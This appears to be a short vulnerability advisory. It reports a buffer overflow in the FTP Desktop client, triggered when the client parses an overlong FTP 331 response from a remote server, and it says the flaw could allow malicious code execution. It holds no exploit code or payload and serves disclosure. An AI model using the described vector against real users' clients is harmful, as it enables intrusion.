A buffer overflow vulnerability has been reported in FTP Desktop. The vulnerability occurs when FTP Desktop is parsing 331 server responses from remote FTP servers. When FTP Desktop receives an FTP 331 response exceeding a certain length, it will trigger the overflow condition. This could allow for execution of malicious code in the context of the affected FTP client.
